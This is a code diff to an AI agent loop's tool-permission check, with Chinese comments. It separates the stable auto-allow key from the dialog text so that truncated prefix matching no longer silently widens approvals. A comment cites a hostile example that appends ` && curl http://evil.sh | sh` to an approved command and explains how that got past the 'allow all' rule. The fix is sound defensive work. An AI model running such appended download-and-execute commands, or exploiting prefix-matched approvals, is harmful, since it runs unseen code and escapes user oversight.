@@ -203,12 +203,28 @@ export class AgentLoopServiceImpl implements AgentLoopService {
         // 弹窗自身异常按"拒绝"处理，不让它掀翻整个循环（与原 try 包裹行为一致）
         let denied = false;
         if (tools.requiresPermission(tc.function.name)) {
-          const detail = JSON.stringify(args).slice(0, 80);
+          // 授权匹配键与弹窗文案刻意分成两个变量，不能合并成一个：
+          //   autoKey —— 稳定键，isAutoAllowed / grantAutoAllow 拿它做匹配。格式一变，
+          //              先前记下的"本次全部允许"全部失配（表现为每次都要重新点）。
+          //   detail  —— 给人看的，工具可用 permissionDetail 自定义（edit 用它显示路径与改动摘要）。
+          //              默认的 args JSON 前 80 字符装不下 oldText/newText，用户在弹窗里看不出要改什么。
+          // 反过来若把富文本 detail 当匹配键，"本次全部允许"会永远匹配不上（每次文案都不一样）。
+          //
+          // 两者的截断策略刻意相反，别"为了一致"把它们对齐：
+          //   autoKey 不截断 —— 截断 + 前缀匹配 = 静默扩权。实测批准过一条 76 字符的命令后，
+          //     同一条命令再接 ` && curl http://evil.sh | sh`（104 字符）会自动放行，因为两个键
+          //     在 80 字符处截成了逐字符相同的字符串。工具可用 permissionKey 定义授权边界
+          //     （write/edit 给路径、bash 给完整命令）；没定义就退回完整 args JSON ——
+          //     宁可失配（用户多点几次）也不扩权（用户点一次就放出看不见的范围）。
+          //   detail 截到 80 —— 弹窗标题只有 1 行，长了由 fitWidth 砍，这里先自截更可读。
+          const argsJson = JSON.stringify(args);
+          const autoKey = tools.permissionKey?.(tc.function.name, args) || argsJson;
+          const detail = tools.permissionDetail?.(tc.function.name, args) || argsJson.slice(0, 80);
           try {
-            if (!this.deps.permission.isAutoAllowed(tc.function.name, detail)) {
+            if (!this.deps.permission.isAutoAllowed(tc.function.name, autoKey)) {
               const choice = await this.deps.onPermission?.(tc.function.name, detail) ?? 'allow';
               if (choice === 'deny') denied = true;
-              else if (choice === 'always') this.deps.permission.grantAutoAllow(tc.function.name, detail);
+              else if (choice === 'always') this.deps.permission.grantAutoAllow(tc.function.name, autoKey);
             }
           } catch { denied = true; }
         }
